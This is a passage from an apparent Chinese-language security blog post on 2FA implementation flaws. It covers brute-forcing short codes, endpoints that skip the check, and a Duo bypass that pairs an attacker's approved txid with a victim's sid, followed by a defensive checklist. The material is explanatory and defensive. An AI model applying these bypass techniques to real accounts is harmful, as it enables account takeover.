&lt;p&gt;要做當然好，阿柚說，但實作上也是要多注意呀！&lt;/p&gt;
&lt;p&gt;先前新聞上（ &lt;a href=&quot;https://news.thewindowsclub.com/hackers-could-bypass-cpanel-2fa-104264/&quot;&gt;Hackers could bypass cPanel 2FA in minutes using brute-force attacks&lt;/a&gt; ）才報導軟體因為 2FA 驗證碼沒有限制提交的時間跟次數，導致駭客可以在幾分鐘內暴力破解僅 4 個數字組成的驗證碼。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;要做好 2FA 必須加上一些限制，例如驗證碼有效的時間不應過長、驗證碼應隨機無法預測、要求輸入錯誤三次就要重新傳送驗證碼等等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;另外，輸入驗證碼後的 API 也應做好保護。例如曾有網站在驗證碼比對成功後對後端發送 &lt;code&gt;/auth/2fa?verify=true&lt;/code&gt; 來表示驗證成功，或甚至直接跳轉 &lt;code&gt;/myaccount/&lt;/code&gt; 進到登入後頁面，這時 API 邏輯根本與 2FA 無關，駭客根本可以忽略驗證碼，直接發同樣的 API 就可以登入啦！&lt;/p&gt;
&lt;p&gt;或是不久前 &lt;a href=&quot;https://portswigger.net/daily-swig/researchers-trick-duo-2fa-into-sending-authentication-request-to-attacker-controlled-device&quot;&gt;Researchers trick Duo 2FA into sending authentication request to attacker-controlled device&lt;/a&gt; 報導了 2FA 驗證時的 state 與當前嘗試登入的 session 無關，導致駭客可以用自己登入時 2FA 驗證的 state 取代正在嘗試破解的 2FA 驗證，導致系統誤以為受害者的裝置已接受驗證。&lt;/p&gt;
&lt;p&gt;本來的機制是：輸入帳號密碼後會觸發 2FA 驗證流程，首先會發送下圖中第一個請求 &lt;code&gt;POST /frame/prompt&lt;/code&gt;，其中 &lt;code&gt;sid&lt;/code&gt; 代表的是當前的 session id。這時伺服器會回傳 &lt;code&gt;txid&lt;/code&gt;，讓網頁端可以持續查詢（poll） 2FA 驗證的狀態，例如是否已傳送通知、使用者驗證了沒等資訊，來判斷登入是否成功。在網頁首次請求 &lt;code&gt;POST /frame/status&lt;/code&gt; 時，伺服器才會對使用者的手機發送推播通知，引導使用者進行第二次驗證。直到手機端點擊確認，伺服器更改了驗證狀態，網頁端才會在下一次查詢時得到 &lt;code&gt;txid&lt;/code&gt; 狀態為 allow 的結果，完成驗證。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/authentication/duo-mechanism.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;Duo security app mechanism&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;那駭客是如何繞過的呢？&lt;/p&gt;
&lt;p&gt;問題出在辨識身份的 &lt;code&gt;sid&lt;/code&gt; 跟辨識 2FA 驗證狀態的 &lt;code&gt;txid&lt;/code&gt; 這兩個並沒有關聯。也就是說，我今天只要拿一個已經驗證成功的 &lt;code&gt;txid&lt;/code&gt; 搭配任意我想要認證的 &lt;code&gt;sid&lt;/code&gt;，系統根本分不出來這個狀態是不是屬於這個身份，就像畢業證書上如果沒有寫名字，那任何人都可以拿這張紙說自己畢業了。&lt;/p&gt;
&lt;p&gt;如下圖，駭客只要自己擁有一個帳號並且知道受害者的帳號密碼，就可以用自己驗證成功的 &lt;code&gt;txid&lt;/code&gt; 搭配用受害者帳密嘗試登入的 &lt;code&gt;sid&lt;/code&gt; 來騙過系統完成驗證。你可以在這裡找到更詳細的 &lt;a href=&quot;https://sensepost.com/blog/2021/duo-two-factor-authentication-bypass/&quot;&gt;writeup&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/authentication/duo-bypass.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;2FA bypass&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;%E9%82%A3%E6%88%91%E8%A9%B2%E6%80%8E%E9%BA%BC%E9%98%B2%EF%BC%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%82%A3%E6%88%91%E8%A9%B2%E6%80%8E%E9%BA%BC%E9%98%B2%EF%BC%9F&quot;&gt;#&lt;/a&gt; 那我該怎麼防？&lt;/h2&gt;
&lt;p&gt;小明聽了這麼多早已暈頭轉向，到底該做到哪些機制或遵守哪些準則呢？&lt;/p&gt;
&lt;p&gt;小明跟阿柚經過一番討論，列出了一系列注意事項：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;確保登入資料必須經由 HTTPS 加密通道傳送&lt;/li&gt;
&lt;li&gt;不要在驗證完成前的 response 中透露登入者的 username 或是 email 等資訊&lt;/li&gt;
&lt;li&gt;防止駭客自動化暴力破解：
&lt;ul&gt;
&lt;li&gt;登入失敗的錯誤訊息應該盡可能籠統而單一，不要過於詳細&lt;/li&gt;
&lt;li&gt;防止駭客透過回覆速度或是頁面中的資訊判別某個帳號是否存在系統中&lt;/li&gt;
&lt;li&gt;應限制帳戶可嘗試登入的次數，例如鎖帳戶或是需等待一段時間才能嘗試&lt;/li&gt;
&lt;li&gt;同時可以做 IP-based rate limiting 限制請求發送速率&lt;/li&gt;
&lt;li&gt;加入其他防自動化的機制，如 CAPTCHA&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;確保程式邏輯沒有漏洞（包含登入、密碼重置、多因素驗證等等）&lt;/li&gt;
&lt;li&gt;幫助使用者設定強一些的密碼，例如 JavaScript 函式庫 zxcvbn 會在使用者建立帳號時進行檢查，禁止使用者選擇強度不足的密碼。雖然不代表密碼一定安全，但至少會符合一定強度的密碼規則，例如：至少八個字元、需使用大小寫與特殊符號、不能跟帳號類似等等。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;%E7%B5%90%E8%AA%9E&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B5%90%E8%AA%9E&quot;&gt;#&lt;/a&gt; 結語&lt;/h2&gt;
&lt;p&gt;看似簡單又常見的登入功能，其實細節中藏著非常多的魔鬼。尤其大多數比較敏感的動作跟資訊都要先經過登入才能存取，如果連這個守門人都不可靠，那可說是門戶大開呀！進行身份驗證時，務必多檢查是否能抵檔駭客的暴力破解以及是否存在邏輯上的缺失，越關鍵的功能越是需要多層防護。&lt;/p&gt;
&lt;p&gt;被盜帳號是誰的錯呢？想想你都用哪些密碼跟服務吧，要是你註冊任何服務都用同樣幾組密碼，又使用一些安全等級堪憂的網站，可要小心囉！&lt;/p&gt;

		</content>
	</entry>
</feed>
